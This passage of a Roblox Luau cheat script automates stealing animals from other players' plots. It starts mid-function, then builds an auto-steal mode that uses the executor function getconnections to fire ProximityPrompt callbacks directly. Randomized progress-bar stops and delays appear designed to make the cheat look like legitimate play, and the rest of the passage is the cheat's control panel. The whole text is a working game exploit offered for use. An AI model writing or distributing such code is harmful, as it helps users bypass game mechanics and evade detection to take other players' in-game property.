	local AS = _G.K7SemiSteal if not animalData then return nil end
	local cached = AS.promptCache[animalData.uid] if cached and cached.Parent then return cached end
	local pod = _semiPodiumFor(animalData) if not pod then return nil end
	for _, p in ipairs(pod:GetDescendants()) do if p:IsA("ProximityPrompt") then AS.promptCache[animalData.uid] = p return p end end return nil
end
local function _semiBuildCallbacks(prompt)
	local AS = _G.K7SemiSteal if AS.internalCache[prompt] then return end
	local data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
	pcall(function()
		if getconnections then
			local holds = getconnections(prompt.PromptButtonHoldBegan) or getconnections(prompt.HoldBegan) or {}
			for _, c in ipairs(holds) do if type(c.Function) == "function" then table.insert(data.holdCallbacks, c.Function) end end
			local triggers = getconnections(prompt.Triggered) or {}
			for _, c in ipairs(triggers) do if type(c.Function) == "function" then table.insert(data.triggerCallbacks, c.Function) end end
		end
	end)
	if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then AS.internalCache[prompt] = data end
end
local function _semiExecute(prompt, animalData)
	local AS = _G.K7SemiSteal if not prompt or not prompt.Parent or not animalData then return false end if AS.state.active then return false end if tick() - (AS.state.lastResultTime or 0) < (AS.cooldown or 0.05) then return false end
	_semiBuildCallbacks(prompt) local data = AS.internalCache[prompt] if not data or not data.ready then return false end
	data.ready = false AS.state.active = true AS.state.startTime = tick() AS.state.phase = "holding" AS.state.label = animalData.name or "Animal"
	task.spawn(function()
		local t0 = AS.state.startTime
		local stops = {0.70, 0.75, 0.80, 0.85, 0.90} local SEMI_STOP = stops[math.random(1, #stops)]
		for _, fn in ipairs(data.holdCallbacks) do task.spawn(function() pcall(fn) end) end
		while AS.enabled and currentMode == "V4" and isOn and tick() - t0 < (AS.holdMin or 1.3) do local rawP = (tick() - t0) / (AS.holdMax or 2.6) setBarProgress(math.min(rawP, SEMI_STOP)) task.wait() end
		AS.state.phase = "waitingRange" local alreadyInRange = _semiDistToAnimal(animalData) <= (tonumber(AS.radius) or 10) local fired = false
		while AS.enabled and currentMode == "V4" and isOn and prompt.Parent do
			local elapsed = tick() - t0 if elapsed > (AS.holdMax or 2.6) then break end
			local rawP2 = elapsed / (AS.holdMax or 2.6) setBarProgress(math.min(rawP2, SEMI_STOP))
			if _semiDistToAnimal(animalData) <= (tonumber(AS.radius) or 10) then
				if not alreadyInRange then task.wait(AS.entryDelay or 0.25) end
				if AS.enabled and currentMode == "V4" and isOn then for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end fired = true end break
			end
			task.wait()
		end
		AS.state.lastResult = fired and ("Stole " .. tostring(AS.state.label)) or ("Missed")
		AS.state.active = false AS.state.phase = "idle" AS.state.lastResultTime = tick()
		if fired then setBarProgress(1) end task.wait(AS.cooldown or 0.05) data.ready = true resetBar()
	end)
	return true
end
local function _semiScanAllPlots()
	local AS = _G.K7SemiSteal if not _semiEnsureSync() then return 0 end local newCache = {}
	for _, plot in ipairs(AS.plots:GetChildren()) do
		local cache = AS.plotSync.caches[plot.Name] local animalList = cache and cache.AnimalList
		if typeof(animalList) == "table" then for slot, animalData in pairs(animalList) do if type(animalData) == "table" then local animalName = animalData.Index local info = AS.animalsData and AS.animalsData[animalName] if info then table.insert(newCache, {name = info.DisplayName or animalName, plot = plot.Name, slot = tostring(slot), uid = plot.Name .. "_" .. tostring(slot)}) end end end end
	end
	AS.animals = newCache return #newCache
end
local function _semiPickClosest()
	local AS = _G.K7SemiSteal local root = _semiRoot() if not root then return nil end local best, bestDist = nil, math.huge
	for _, data in ipairs(AS.animals) do if not _semiIsMyBase(data) then local pos = _semiAnimalPos(data) local dist = pos and (root.Position - pos).Magnitude or math.huge if dist <= (AS.primeRange or 80) and dist < bestDist then best, bestDist = data, dist end end end return best
end
local function _semiEnsureScanThread()
	local AS = _G.K7SemiSteal if AS.scanThread then return end
	AS.scanThread = task.spawn(function() while _G.K7SemiSteal do if AS.enabled or currentMode == "V4" then pcall(_semiScanAllPlots) end task.wait(5) end end)
end
local function stopSemi()
	local AS = _G.K7SemiSteal AS.enabled = false if AS.conn then AS.conn:Disconnect() AS.conn = nil end AS.state.active = false AS.state.phase = "idle" resetBar()
end
local function startSemi()
	if not isOn then return end
	local AS = _G.K7SemiSteal AS.radius = 10 AS.enabled = true pcall(_semiEnsureSync) _semiEnsureScanThread() pcall(_semiScanAllPlots)
	if AS.conn then AS.conn:Disconnect() AS.conn = nil end
	AS.conn = RunService.Heartbeat:Connect(function()
		if not AS.enabled or not isOn or currentMode ~= "V4" or AS.state.active then return end
		local target = _semiPickClosest() if not target then if tick() - (AS.lastScan or 0) > 1.2 then AS.lastScan = tick() pcall(_semiScanAllPlots) end return end
		local prompt = _semiFindPrompt(target) if prompt then _semiExecute(prompt, target) end
	end)
end

local function syncMode()
	stopNormal() stopV3() stopSemi()
	if not isOn then return end
	if currentMode == "V1" or currentMode == "V2" then startNormal()
	elseif currentMode == "V3" then startV3()
	elseif currentMode == "V4" then startSemi() end
end

local function setScriptState(on)
	isOn = on
	if isOn then
		onBtn.Text = "ON"
		onBtn.TextColor3 = Color3.fromRGB(60, 255, 100)
		onBtn.BackgroundColor3 = Color3.fromRGB(20, 35, 25)
		stroke.Enabled = true
		syncMode()
	else
		onBtn.Text = "OFF"
		onBtn.TextColor3 = Color3.fromRGB(255, 60, 60)
		onBtn.BackgroundColor3 = Color3.fromRGB(35, 20, 20)
		stopNormal() stopV3() stopSemi()
		resetBar()
		stroke.Enabled = false
	end
end

minusBtn.MouseButton1Click:Connect(function()
	if isLocked then return end
	uiScale = math.max(0.5, uiScale - 0.1)
	scaleVal.Text = string.format("%.1f", uiScale)
	main.Size = UDim2.new(0, 230 * uiScale, 0, isOpen and 238 * uiScale or 85 * uiScale)
end)
plusBtn.MouseButton1Click:Connect(function()
	if isLocked then return end
	uiScale = math.min(2.0, uiScale + 0.1)
	scaleVal.Text = string.format("%.1f", uiScale)
	main.Size = UDim2.new(0, 230 * uiScale, 0, isOpen and 238 * uiScale or 85 * uiScale)
end)

for name, btn in pairs(modeButtons) do
	btn.MouseButton1Click:Connect(function()
		if isLocked then return end
		currentMode = name
		for n, b in pairs(modeButtons) do
			b.BackgroundColor3 = n == name and Color3.fromRGB(130, 80, 255) or Color3.fromRGB(35, 30, 60)
		end
		syncMode()
	end)
end

avgBtn.MouseButton1Click:Connect(function()
	if isLocked then return end
	currentTrigger = "Average"
	avgBtn.BackgroundColor3 = Color3.fromRGB(130, 80, 255)
	avgBtn.TextColor3 = Color3.new(1, 1, 1)
	tryBtn.BackgroundColor3 = Color3.fromRGB(35, 30, 60)
	tryBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
end)
tryBtn.MouseButton1Click:Connect(function()
	if isLocked then return end
	currentTrigger = "Tryhard"
	tryBtn.BackgroundColor3 = Color3.fromRGB(130, 80, 255)
	tryBtn.TextColor3 = Color3.new(1, 1, 1)
	avgBtn.BackgroundColor3 = Color3.fromRGB(35, 30, 60)
	avgBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
end)

lockBtn.MouseButton1Click:Connect(function()
	isLocked = not isLocked
	lockBtn.Text = isLocked and "🔒" or "🔓"
end)

onBtn.MouseButton1Click:Connect(function()
	setScriptState(not isOn)
end)

toggleBtn.MouseButton1Click:Connect(function()
	isOpen = not isOpen
	if isOpen then
		openFrame.Visible = true
		main.Size = UDim2.new(0, 230 * uiScale, 0, 238 * uiScale)
		toggleBtn.Text = "−"
		radiusLabel.Visible = false
		discord.Position = UDim2.new(0, 5, 0, 203)
		bar.Position = UDim2.new(0, 6, 0, 220)
	else
		openFrame.Visible = false
		main.Size = UDim2.new(0, 230 * uiScale, 0, 85 * uiScale)
		toggleBtn.Text = "+"
		radiusLabel.Visible = true
		discord.Position = UDim2.new(0, 5, 0, 47)
		bar.Position = UDim2.new(0, 6, 0, 65)
	end
end)

setScriptState(true)